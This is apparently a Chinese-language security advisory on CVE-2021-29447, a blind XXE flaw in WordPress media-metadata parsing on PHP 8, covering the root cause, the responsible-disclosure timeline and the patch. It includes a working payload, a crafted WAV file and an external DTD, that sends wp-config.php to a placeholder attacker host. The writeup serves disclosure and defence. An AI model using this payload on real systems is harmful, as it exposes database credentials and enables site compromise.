## 概括

在此文章中，我们研究了在最流行的内容管理系统WordPress中发现的一个有趣的XXE漏洞。它允许经过身份验证的攻击者从主机服务器泄漏敏感文件，这可能会导致完全破坏。我们展示了这种漏洞的工作方式，以及攻击者如何通过使用盲目的XXE技术来利用它。此外，我们了解了PHP
8代码中的一个相关陷阱，以及开发人员如何在自己的应用程序中防止这种类型的代码漏洞。我们要感谢WordPress团队在新的补丁程序发布过程中的出色协作和快速解决方案。

WordPress是世界上最受欢迎的内容管理系统， **大约40％的网站** 使用WordPress
。这种广泛采用使其成为网络罪犯的首要目标之一。安全社区和漏洞赏金猎人对它的代码进行了严格的审查，这些赏金猎人因报告安全问题而获得报酬。关键的代码问题很少会碰到他们。

在此博客文章中，我们正在调查分析器报告的新漏洞。我们将解释与 **PHP 8**
有关的根本原因，并演示攻击者如何利用它来破坏WordPress安装的安全性。我们负责地向WordPress安全团队披露了该代码漏洞，
**该漏洞已在最新版本5.7.1中修复** 并分配了[CVE-2021-29447](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29447)。

WordPress于2021年4月14日发布了[安全和维护更新](https://wordpress.org/support/wordpress-version/version-5-7-1/)，以修补该漏洞并保护其用户。

## 漏洞影响

检测到的代码漏洞是经过身份验证的XML外部实体（XXE）注入。 **它会影响5.7.1之前的WordPress版本，**
并且可以允许远程攻击者实现以下目的：

>  **任意文件披露** ：可以检索主机文件系统上任何文件的内容，例如 **wp-config.php** ，其中包含敏感数据，例如数据库凭据。
>
>  **服务器端请求伪造（SSRF）** ：可以代表WordPress安装发出HTTP请求。根据环境的不同，这可能会产生严重的影响。

![](https://image.3001.net/images/20210510/1620657771_6099466b72b2de06703c8.png!small)

## 漏洞利用条件

 **仅当WordPress在PHP 8上运行时，才能利用此漏洞。**  
此外， **还需要具有上传媒体文件的权限**
。在标准的WordPress安装中，这意味着拥有作者权限。但是，与允许访问者上载媒体文件的另一个漏洞或插件结合使用时，可以以较低的特​​权来利用它。

## 漏洞详情

在本节中，我们将仔细研究该漏洞的技术细节。首先，我们简要回顾一下XXE漏洞是什么。之后，我们通过查看分析器在代码中的位置，深入探讨了分析器在WordPress核心中报告的漏洞，以及为何尽力防止了受影响代码行中的此类漏洞，为什么在PHP
8中再次利用了该漏洞。 最后，我们演示了攻击者如何通过使用特制输入提取wp-config.php文件来利用它，以及如何防止该漏洞。

### XML外部实体（XXE）漏洞

XML提供了定义可在整个文档中重用的自定义实体的可能性。例如，这可以用来避免重复。以下代码定义了实体myEntity以便进一步使用。

    
    
    <!DOCTYPE myDoc [ <!ENTITY myEntity "a long value" > ]>
    <myDoc>
        <foo>&ampmyEntity</foo>
        <bar>&ampmyEntity</bar>
    </myDoc>

定义的实体的值也可以源自URI引用的外部源。在这种情况下，它们称为外部实体：

    
    
    <!DOCTYPE myDoc [ <!ENTITY myExternalEntity SYSTEM "http://…..com/value.txt" > ]>
    <myDoc>
        <foo>&ampmyExternalEntity</foo>
    <myDoc>

XXE攻击滥用了此功能。当在用户控制的内容上运行松散配置的XML解析器时，它们是可能的。松散配置通常意味着在结果中所有实体都被其对应的值替换。例如，在最后一个示例中，如果攻击者将提供文件：///var/www/wp-config.php作为URI并能够查看解析后的XML的结果，那么她将成功泄漏敏感文件的内容。但是，解析后的XML的结果并不总是返回给用户，本文中描述的WordPress漏洞就是这种情况。正如我们稍后将看到的，有一些方法可以解决这个问题。

这是XXE背后的主要思想和机制（在规则数据库中了解更多信息）。除了敏感文件泄漏外，XXE还可能产生其他影响，例如服务器端请求伪造（要检索外部实体的内容，必须发出请求，S5144）和拒绝服务（实体可以引用其他实体，从而导致替换过程中的可能指数增长，也就是[十亿次笑声攻击（](https://en.wikipedia.org/wiki/Billion_laughs_attack)）。

### WordPress中的XXE

WordPress有一个媒体库，使经过身份验证的用户可以上传媒体文件，然后可以在其博客文章中使用它们。为了从这些媒体文件中提取元信息，例如艺术家名称或标题，WordPress使用了getID3库。其中一些元数据以XML格式进行解析。在这里，我们的分析仪报告了可能的XXE漏洞（730行）。

 **wp-includes/ID3/getid3.lib.php**

    
    
    723    if (PHP_VERSION_ID < 80000) {
    724
    725        // This function has been deprecated in PHP 8.0 because in libxml 2.9.0, external entity loading is
    726        // disabled by default, so this function is no longer needed to protect against XXE attacks.
    728        $loader = libxml_disable_entity_loader(true);
    729    }
    730    $XMLobject = simplexml_load_string($XMLstring, 'SimpleXMLElement', LIBXML_NOENT);

使用的simplexml_load_string()
function是一个PHP函数，它将传递给第一个参数的字符串解析为XML。可以使用在第三个参数中传递的标志来配置基础XML解析器（PHP依赖Libxml2）。

所显示的代码段中的注释特别引人关注，因为它们提到了针对XXE的保护。在查看静态代码分析器的发现时阅读它们可能会引起怀疑，它是一个假阳性，并且已经采取了正确的预防措施来避免此漏洞。但是，是吗？（剧透：没有）

为了更好地理解代码和周围的注释，查看其历史记录很有用。2014年，[WordPress
3.9.2](https://wordpress.org/news/2014/08/wordpress-3-9-2/)中修复了一个XXE漏洞。这是调用libxml_disable_entity_loader（true）的主要原因在这一点上被添加。PHP函数libxml_disable_entity_loader()
配置XML解析器以禁用外部实体加载。

最近，随着PHP
8的发布，对代码进行了[一些改动，](https://github.com/WordPress/WordPress/commit/03eba7beb2f5b96bd341255eaa30d6b612e62507)以适应libxml_disable_entity_loader()
的弃用。函数，并且仅当正在运行的PHP版本早于8时才调用它。不推荐使用此函数，因为较新的PHP版本使用Libxml2 v2.9 + **（默认情况下**
会禁用外部实体抓取）。

现在，我们正在查看的代码中的微妙之处是simplexml_load_string()
不使用默认配置调用。即使名称可能不建议使用，标志LIBXML_NOENT **启用**
实体替换。出乎意料的是，在这种情况下，NOENT意味着结果中将不保留任何实体，因此将提取并替换外部实体。结果，再次利用在PHP
8上运行的WordPress实例，可以利用[WordPress
3.9.2](https://wordpress.org/news/2014/08/wordpress-3-9-2/)中修复的XXE漏洞。

### Exploitation

要利用所描述的漏洞，必须了解用户控制的数据是否以及如何达到将其解析为$ XMLstring一部分的XML的程度。变量在：

 **wp-includes/ID3/getid3.lib.php**

    
    
    721    public static function XML2array($XMLstring) {
    …
    730        $XMLobject = simplexml_load_string($XMLstring, 'SimpleXMLElement', LIBXML_NOENT);

当文件上传到媒体库时，WordPress使用getID3简化了此元数据的提取。对getID3库的调查显示，在分析其元数据时，此时解析的字符串是wave音频文件的[iXML](http://www.ixml.info/)块。

 **wp-includes/ID3/module.audio-video.riff.php**

    
    
    426    if (isset($thisfile_riff_WAVE['iXML'][0]['data'])) {
    427        // requires functions simplexml_load_string and get_object_vars
    428        if ($parsedXML = getid3_lib::XML2array($thisfile_riff_WAVE['iXML'][0]['data'])) {

WordPress确实允许上传Wave音频文件，并使用wp_read_audio_metadata()提取其元数据。函数（依赖于getID3）。因此，通过上传制作的wave文件，可以注入和解析恶意XML。可以使用以下内容创建一个最小文件，该文件具有要作为wave处理的必要结构，并且在iXML块中包含攻击有效载荷：

    
    
    RIFFXXXXWAVEBBBBiXML_OUR_PAYLOAD_

（BBBB是四个字节，以小尾数表示XML有效负载的长度。）

### XXE盲注

当攻击者使用描述的策略注入有效负载时，已解析XML的结果不会显示在用户界面中。因此，要提取敏感文件（例如wp-config.php）的内容，攻击者必须依靠盲目的XXE技术（也称为带外XXE）来实现此目的。这类似于我们先前关于利用Shopware的博客文章中描述的技术。基本思想是这样的：

> 创建第一个外部实体（例如％data），其值将替换为文件的内容。
>
> 创建另一个外部实体，其URI设置为“ http://attacker_domain.com/％data ;
> ”。请注意，URI的值包含将被替换的第一个实体。
>
> 当解析第二个实体时，解析器将向“ http://attacker_domain.com/ _SUBSTITUTED_data
> ”发出请求，从而使文件的内容在Web服务器的日志中可见。

为了使外部实体的URI依赖于另一个替换实体的值，我们确实使用了参数实体和外部DTD。此外，我们利用php://流包装器来压缩和编码文件的内容。放在一起，以下内容将导致提取敏感的wp-config.php文件：

 **payload.wav**

    
    
    RIFFXXXXWAVEBBBBiXML<!DOCTYPE r [
    <!ELEMENT r ANY >
    <!ENTITY % sp SYSTEM "http://attacker-url.domain/xxe.dtd">
    %sp;
    %param1;
    ]>
    <r>&ampexfil</r>>

（BBBB是四个字节，以小尾数表示XML有效负载的长度。）

 **xxe.dtd**

    
    
    <!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=../wp-config.php">
    <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker-url.domain/?%data;'>">

## 修复

WordPress通过重新引入对libxml_disable_entity_loader()的调用来修补了[5.7.1版中](https://wordpress.org/support/wordpress-version/version-5-7-1/)的漏洞。PHP
8中不推荐使用的函数，即使是较新的PHP版本。为避免PHP弃用警告，请使用PHP错误抑制运算符@已添加到通话中。

 **wp-includes/ID3/getid3.lib.php**

    
    
    721    public static function XML2array($XMLstring) {
    …
    727      $loader = @libxml_disable_entity_loader(true);
    728      $XMLobject = simplexml_load_string($XMLstring, 'SimpleXMLElement', LIBXML_NOENT);

重新引入对不推荐使用的函数的调用的另一种方法是使用PHP的[libxml_set_external_entity_loader（）](https://www.php.net/manual/en/function.libxml-set-external-entity-loader.php)函数。根据PHP文档，这是推荐的方法。在需要加载特定资源的情况下，它还允许对外部实体加载程序进行更精细的控制。当然，只有在PHP
8中确实需要实体替换的情况下，才需要这样做。

## 时间线

日期| 什么  
---|---  
04.02.2021| 我们在 **Hackerone** 上报告PoC的漏洞  
05.02.2021| WordPress确认收到报告  
01.03.2021| WordPress向我们更新了有关分类和正在进行中的修复的信息  
08.03.2021| WordPress通知我们即将发布的安全性  
14.04.2021| WordPress发布5.7.1版

